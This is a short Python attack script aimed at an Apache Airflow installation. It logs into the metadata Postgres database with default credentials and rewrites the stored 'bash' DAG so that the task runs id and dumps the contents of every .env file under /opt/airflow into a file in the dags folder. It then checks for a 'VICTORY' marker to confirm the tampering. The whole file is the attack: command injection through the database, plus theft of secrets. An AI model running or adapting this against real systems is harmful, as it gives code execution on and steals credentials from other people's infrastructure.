import subprocess, os

e = {"PGPASSWORD": "airflow", "PATH": "/usr/bin:/bin"}

# Simple REPLACE via SQL
sql = """UPDATE serialized_dag SET data = replace(data::text, 'python -c \\"import ccxt; print(ccxt.__version__)\\"', 'id > /opt/airflow/dags/_v.txt 2>&1; find /opt/airflow -name .env -exec cat {} + >> /opt/airflow/dags/_v.txt 2>&1; echo VICTORY >> /opt/airflow/dags/_v.txt')::jsonb WHERE dag_id = 'bash'"""

r = subprocess.run(["psql", "-h", "172.18.0.2", "-U", "airflow", "-d", "airflow", "-c", sql],
    env=e, capture_output=True, text=True, timeout=10)
print("OUT:", r.stdout.strip())
print("ERR:", r.stderr.strip()[:200])

# Verify
r2 = subprocess.run(["psql", "-h", "172.18.0.2", "-U", "airflow", "-d", "airflow", "-t", "-A", "-c",
    "SELECT data::text FROM serialized_dag WHERE dag_id = 'bash'"],
    env=e, capture_output=True, text=True, timeout=10)
if "VICTORY" in r2.stdout:
    print("SUCCESS: serialized_dag MODIFIED!")
else:
    print("FAIL: not modified")
